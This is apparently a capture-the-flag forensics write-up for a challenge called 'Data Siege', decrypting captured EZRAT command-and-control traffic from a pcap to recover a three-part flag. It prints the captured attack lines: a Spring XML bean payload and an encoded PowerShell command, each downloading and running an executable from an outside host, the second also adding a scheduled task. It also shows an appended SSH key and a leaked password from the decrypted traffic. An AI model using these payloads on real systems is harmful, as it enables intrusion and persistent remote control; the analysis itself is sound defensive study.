# Data Siege

# Data Siege

### Description

POINTS: 400\

\
DIFFICULTY: medium

It was a tranquil night in the Phreaks headquarters, when the entire district erupted in chaos. Unknown assailants, rumored to be a rogue foreign faction, have infiltrated the city's messaging system and critical infrastructure. Garbled transmissions crackle through the airwaves, spewing misinformation and disrupting communication channels. We need to understand which data has been obtained from this attack to reclaim control of the and communication backbone. Note: flag is splitted in three parts.

### Analysis

If we filter given pcap file in wireshark for HTTP we get interactions. First one seems to exploit XXE on Spring and download file: `aQ4caZ.exe`.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
<bean id="WHgLtpJX" class="java.lang.ProcessBuilder" init-method="start">
  <constructor-arg>
    <list>
      <value>cmd.exe</value>
      <value>/c</value>
      <value><![CDATA[powershell Invoke-WebRequest 'http://10.10.10.21:8000/aQ4caZ.exe' -OutFile 'C:\temp\aQ4caZ.exe'; Start-Process 'c:\temp\aQ4caZ.exe']]></value>
    </list>
  </constructor-arg>
</bean>
</beans>
```

To export go to `File -> Export Objects -> HTTP`\

\
It seems to be NET framework binary so to debug we'll need dnSpy (Windows).

```bash
└─$ strings aQ4caZ.exe | grep NET
.NETFramework,Version=v4.8
.NET Framework 4.8
```

The program seems to communicate to C2 via TCP.

![data-siege-1](/assets/ctf/htb/data-siege-1.png)

In encrypted form

![data-siege-2](/assets/ctf/htb/data-siege-2.png)

```c#
/// Constantes
// Token: 0x04000021 RID: 33
private static string _encryptKey = "VYAemVeO3zUDTL6N62kVA";

/// EZRATClient.Program
// Token: 0x06000007 RID: 7 RVA: 0x00002104 File Offset: 0x00000304
public static string Encrypt(string clearText) {
	string result;
	try {
		string encryptKey = Constantes.EncryptKey;
		byte[] bytes = Encoding.Default.GetBytes(clearText);
		using (Aes aes = Aes.Create()) {
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(encryptKey, new byte[]{86,101,114,121,95,83,51,99,114,51,116,95,83});
			aes.Key = rfc2898DeriveBytes.GetBytes(32);
			aes.IV = rfc2898DeriveBytes.GetBytes(16);
			using (MemoryStream memoryStream = new MemoryStream()) {
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write)) {
					cryptoStream.Write(bytes, 0, bytes.Length);
					cryptoStream.Close();
				}
				clearText = Convert.ToBase64String(memoryStream.ToArray());
			}
		}
		result = clearText;
	}
	catch (Exception) {
		result = clearText;
	}
	return result;
}
```

### Solution

Extract messages going in and out:

```bash
└─$ tshark -r capture.pcap -Y 'tcp.stream eq 5' -T json |
    jq '.[]._source.layers.data."data.data"' |
    sed -E '/^null$/d; s/[":]//g'
```

I used C# to decode the values:

<details>

<summary>Program.cs</summary>

```c#
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class Program {
    // https://stackoverflow.com/a/9995303
    public static byte[] HexToBytes(string hex) {
        if (hex.Length % 2 == 1)
            throw new Exception("The binary key cannot have an odd number of digits");
        byte[] arr = new byte[hex.Length >> 1];
        for (int i = 0; i < hex.Length >> 1; ++i) {
            arr[i] = (byte)((GetHexVal(hex[i << 1]) << 4) + (GetHexVal(hex[(i << 1) + 1])));
        }
        return arr;
    }

    public static int GetHexVal(char hex) {
        int val = (int)hex;
        return val - (val < 58 ? 48 : (val < 97 ? 55 : 87));
    }

    static string ReplaceNonPrintable(string inputString, char replace) {
        StringBuilder result = new StringBuilder();
        foreach (char c in inputString) {
            if (!Char.IsControl(c) && !Char.IsWhiteSpace(c)) {
                result.Append(c);
            } else {
                result.Append(replace);
            }
        }
        return result.ToString();
    }

    public static void Main() {
        string filePath = "./messages.txt";
        string encryptKey = "VYAemVeO3zUDTL6N62kVA";
        string[] lines = File.ReadAllLines(filePath);

        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(encryptKey, new byte[]{86,101,114,121,95,83,51,99,114,51,116,95,83});

        using (Aes aes = Aes.Create()) {
            aes.Key = rfc2898DeriveBytes.GetBytes(32);
            aes.IV = rfc2898DeriveBytes.GetBytes(16);
            aes.Mode = CipherMode.CBC;

            ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
            
            foreach (string line in lines) {
                byte[] encryptedBytes = HexToBytes(line);
                string encryptedPayloadBase64 = Encoding.ASCII.GetString(encryptedBytes);
                int questionMarkIndex = encryptedPayloadBase64.IndexOf('?');
                if (questionMarkIndex != -1) {
                    encryptedPayloadBase64 = encryptedPayloadBase64.Substring(questionMarkIndex + 1);
                }
                try {
                    byte[] encryptedPayload = Convert.FromBase64String(encryptedPayloadBase64);
                    byte[] decryptedBytes = decryptor.TransformFinalBlock(encryptedPayload, 0, encryptedPayload.Length);
                    string decryptedData = Encoding.UTF8.GetString(decryptedBytes);
                    Console.WriteLine("Decrypted data: " + ReplaceNonPrintable(decryptedData, '_'));
                } catch (Exception e){
                    // Console.WriteLine("Error " + e);
                }
            }
        }
    }
}
```

</details>

<details>

<summary>Program_output.txt</summary>

```powershell
PS C:\Users\<>\Desktop> C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe .\Program.cs && .\Program.exe
Decrypted data: getinfo-0
Decrypted data: X?_??_?#_8?5?V?_.10.22|SRV01|SRV01\svc01|Windows_10_Enterprise_Evaluation|0.1.6.1
Decrypted data: ?$??`D?O??G_??B?2060;svchost?5316;ApplicationFrameHost?4920;csrss?388;svchost?1372;svchost?832;VBoxTray?2748;fontdrvhost?684;services?576;svchost?3528;lsass?584;svchost?6872;svchost?1552;spoolsv?1748;VBoxService?1156;svchost?760;conhost?4108;svchost?1152;dllhost?6864;svchost?2528;svchost?1936;Memory_Compression?1428;RuntimeBroker?4692;svchost?4112;svchost?1932;svchost?748;smss?284;svchost?1140;svchost?6852;svchost?2320;MicrosoftEdge?5076;svchost?1332;svchost?740;svchost?3888;conhost?4896;dwm?340;java?6052;svchost?928;svchost?3488;YourPhone?1320;svchost?1516;dllhost?4204;SearchUI?4664;svchost?328;winlogon?524;SgrmBroker?6628;svchost?2096;svchost?1504;cmd?2488;svchost?1304;NisSrv?2336;MicrosoftEdgeSH?5636;svchost?1104;browser_broker?4592;svchost?1100;svchost?5284;explorer?4052;svchost?1164;svchost?2076;svchost?1680;aQ4caZ?7148;svchost?692;svchost?100;dumpcap?3516;MsMpEng?2260;RuntimeBroker?4820;svchost?1272;Microsoft.Photos?6392;svchost?3436;fontdrvhost?676;cmd?84;taskhostw?3628;RuntimeBroker?6188;RuntimeBroker?1384;java?7028;MicrosoftEdgeCP?5592;svchost?1256;svchost?3816;csrss?464;Registry?68;sihost?3416;SecurityHealthSystray?3156;svchost?6368;svchost?6564;wininit?456;ctfmon?3940;svchost?1636;SecurityHealthService?844;svchost?1040;svchost?2024;svchost?6980;svchost?1628;svchost?1824;svchost?1288;wlms?2216;RuntimeBroker?5564;svchost?5364;svchost?1620;svchost?2012;svchost?396;svchost?6540;RuntimeBroker?6780;WindowsInternal.ComposableShell.Experiences.TextInput.InputApp?2200;svchost?1604;svchost?788;svchost?1400;uhssvc?6824;SearchIndexer?5532;svchost?4940;svchost?3560;svchost?1392;svchost?1588;svchost?1784;wrapper?2176;svchost?2568;ShellExperienceHost?4536;System?4;conhost?2368;OneDrive?1184;svchost?1472;Idle?0;
Decrypted data: ?)Q4??\?????T??%
Decrypted data: _?q???^T_i???_y4c01__
Decrypted data: }_?_/_pnX\?????p-rsa_AAAAB3NzaC1yc2EAAAADAQABAAABAQCwyPZCQyJ/s45lt+cRqPhJj5qrSqd8cvhUaDhwsAemRey2r7Ta+wLtkWZobVIFS4HGzRobAw9s3hmFaCKI8GvfgMsxDSmb0bZcAAkl7cMzhA1F418CLlghANAPFM6Aud7DlJZUtJnN2BiTqbrjPmBuTKeBxjtI0uRTXt4JvpDKx9aCMNEDKGcKVz0KX/hejjR/Xy0nJxHWKgudEz3je31cVow6kKqp3ZUxzZz9BQlxU5kRp4yhUUxo3Fbomo6IsmBydqQdB+LbHGURUFLYWlWEy+1otr6JBwpAfzwZOYVEfLypl3Sjg+S6Fd1cH6jBJp/mG2R2zqCKt3jaWH5SJz13_HTB{c0mmun1c4710n5_>>_C:\Users\svc01\.ssh\authorized_keys
Decrypted data: >_?`5_???__:??sers\svc01\Documents
Decrypted data: _2?xir?Z??_??p$hin_drive_C_is_Windows_10___Volume_Serial_Number_is_B4A6-FEC6_____Directory_of_C:\Users\svc01\Documents____02/28/2024__07:13_AM____<DIR>__________.__02/28/2024__07:13_AM____<DIR>__________..__02/28/2024__05:14_AM________________76_credentials.txt_________________1_File(s)_____________76_bytes_________________2_Dir(s)__24,147,230,720_bytes_free__
Decrypted data: 0?????rd?k????pUsers\svc01\Documents\credentials.txt
Decrypted data: /QT???d??_???~/O:_svc01__Password:_Passw0rdCorp5421____2nd_flag_part:__h45_b33n_r357
Decrypted data: ???/???,??a???ycle.Bin?2|BGinfo?2|Boot?2|Documents_and_Settings?2|PerfLogs?2|Program_Files?2|Program_Files_(x86)?2|ProgramData?2|Recovery?2|System_Volume_Information?2|temp?2|Users?2|Windows?2|bootmgr?1?408364|BOOTNXT?1?1|BOOTSECT.BAK?1?8192|bootTel.dat?1?80|pagefile.sys?1?738197504|swapfile.sys?1?268435456|
Decrypted data: _?99?\?_??L'0???ycle.Bin?2|BGinfo?2|Boot?2|Documents_and_Settings?2|PerfLogs?2|Program_Files?2|Program_Files_(x86)?2|ProgramData?2|Recovery?2|System_Volume_Information?2|temp?2|Users?2|Windows?2|bootmgr?1?408364|BOOTNXT?1?1|BOOTSECT.BAK?1?8192|bootTel.dat?1?80|pagefile.sys?1?738197504|swapfile.sys?1?268435456|
Decrypted data: _?99?\?_??Lhq???
Decrypted data: =?b???6?!?F?_??;aQ4caZ.exe?1?29184|
Decrypted data: ??i?_?5?|??_??4cAcFrqA.ps1

```

</details>

Idk why I thought C# would be fun... It wasnt!

We get 2 parts of the flag from the output:

1. `...HTB{c0mmun1c4710n5_>>_C:\Users...`
2. `...2nd_flag_part:__h45_b33n_r357...`

In the traffic one command was not encrpyted:

```
powershell.exe -encoded "CgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwAHMAOgAvAC8AdwBpAG4AZABvAHcAcwBsAGkAdgBlAHUAcABkAGEAdABlAHIALgBjAG8AbQAvADQAZgB2AGEALgBlAHgAZQAiACwAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAHMAdgBjADAAMQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwANABmAHYAYQAuAGUAeABlACIAKQAKAAoAJABhAGMAdABpAG8AbgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAQQBjAHQAaQBvAG4AIAAtAEUAeABlAGMAdQB0AGUAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAHMAdgBjADAAMQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwANABmAHYAYQAuAGUAeABlACIACgAKACQAdAByAGkAZwBnAGUAcgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAVAByAGkAZwBnAGUAcgAgAC0ARABhAGkAbAB5ACAALQBBAHQAIAAyADoAMAAwAEEATQAKAAoAJABzAGUAdAB0AGkAbgBnAHMAIAA9ACAATgBlAHcALQBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAFMAZQB0AHQAaQBuAGcAcwBTAGUAdAAKAAoAIwAgADMAdABoACAAZgBsAGEAZwAgAHAAYQByAHQAOgAKAAoAUgBlAGcAaQBzAHQAZQByAC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAgAC0AVABhAHMAawBOAGEAbQBlACAAIgAwAHIAMwBkAF8AMQBuAF8ANwBoADMAXwBoADMANABkAHEAdQA0AHIANwAzAHIANQB9ACIAIAAtAEEAYwB0AGkAbwBuACAAJABhAGMAdABpAG8AbgAgAC0AVAByAGkAZwBnAGUAcgAgACQAdAByAGkAZwBnAGUAcgAgAC0AUwBlAHQAdABpAG4AZwBzACAAJABzAGUAdAB0AGkAbgBnAHMACgA="
```

[Cyberchef Recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64\('A-Za-z0-9%2B/%3D',true,false\)Remove_null_bytes\(\)\&input=Q2dBb0FFNEFaUUIzQUMwQVR3QmlBR29BWlFCakFIUUFJQUJUQUhrQWN3QjBBR1VBYlFBdUFFNEFaUUIwQUM0QVZ3QmxBR0lBUXdCc0FHa0FaUUJ1QUhRQUtRQXVBRVFBYndCM0FHNEFiQUJ2QUdFQVpBQkdBR2tBYkFCbEFDZ0FJZ0JvQUhRQWRBQndBSE1BT2dBdkFDOEFkd0JwQUc0QVpBQnZBSGNBY3dCc0FHa0FkZ0JsQUhVQWNBQmtBR0VBZEFCbEFISUFMZ0JqQUc4QWJRQXZBRFFBWmdCMkFHRUFMZ0JsQUhnQVpRQWlBQ3dBSUFBaUFFTUFPZ0JjQUZVQWN3QmxBSElBY3dCY0FITUFkZ0JqQURBQU1RQmNBRUVBY0FCd0FFUUFZUUIwQUdFQVhBQlNBRzhBWVFCdEFHa0FiZ0JuQUZ3QU5BQm1BSFlBWVFBdUFHVUFlQUJsQUNJQUtRQUtBQW9BSkFCaEFHTUFkQUJwQUc4QWJnQWdBRDBBSUFCT0FHVUFkd0F0QUZNQVl3Qm9BR1VBWkFCMUFHd0FaUUJrQUZRQVlRQnpBR3NBUVFCakFIUUFhUUJ2QUc0QUlBQXRBRVVBZUFCbEFHTUFkUUIwQUdVQUlBQWlBRU1BT2dCY0FGVUFjd0JsQUhJQWN3QmNBSE1BZGdCakFEQUFNUUJjQUVFQWNBQndBRVFBWVFCMEFHRUFYQUJTQUc4QVlRQnRBR2tBYmdCbkFGd0FOQUJtQUhZQVlRQXVBR1VBZUFCbEFDSUFDZ0FLQUNRQWRBQnlBR2tBWndCbkFHVUFjZ0FnQUQwQUlBQk9BR1VBZHdBdEFGTUFZd0JvQUdVQVpBQjFBR3dBWlFCa0FGUUFZUUJ6QUdzQVZBQnlBR2tBWndCbkFHVUFjZ0FnQUMwQVJBQmhBR2tBYkFCNUFDQUFMUUJCQUhRQUlBQXlBRG9BTUFBd0FFRUFUUUFLQUFvQUpBQnpBR1VBZEFCMEFHa0FiZ0JuQUhNQUlBQTlBQ0FBVGdCbEFIY0FMUUJUQUdNQWFBQmxBR1FBZFFCc0FHVUFaQUJVQUdFQWN3QnJBRk1BWlFCMEFIUUFhUUJ1QUdjQWN3QlRBR1VBZEFBS0FBb0FJd0FnQURNQWRBQm9BQ0FBWmdCc0FHRUFad0FnQUhBQVlRQnlBSFFBT2dBS0FBb0FVZ0JsQUdjQWFRQnpBSFFBWlFCeUFDMEFVd0JqQUdnQVpRQmtBSFVBYkFCbEFHUUFWQUJoQUhNQWF3QWdBQzBBVkFCaEFITUFhd0JPQUdFQWJRQmxBQ0FBSWdBd0FISUFNd0JrQUY4QU1RQnVBRjhBTndCb0FETUFYd0JvQURNQU5BQmtBSEVBZFFBMEFISUFOd0F6QUhJQU5RQjlBQ0lBSUFBdEFFRUFZd0IwQUdrQWJ3QnVBQ0FBSkFCaEFHTUFkQUJwQUc4QWJnQWdBQzBBVkFCeUFHa0Fad0JuQUdVQWNnQWdBQ1FBZEFCeUFHa0Fad0JuQUdVQWNnQWdBQzBBVXdCbEFIUUFkQUJwQUc0QVp3QnpBQ0FBSkFCekFHVUFkQUIwQUdrQWJnQm5BSE1BQ2dBPQ)

![data-siege-3](/assets/ctf/htb/data-siege-3.png)

::: tip Flag
`HTB{c0mmun1c4710n5\_h45\_b33n\_r3570r3d\_1n\_7h3\_h34dqu4r73r5}`
:::

::: info :information_source:
Project: [EZRAT](https://github.com/Exo-poulpe/EZRAT/tree/master)
:::
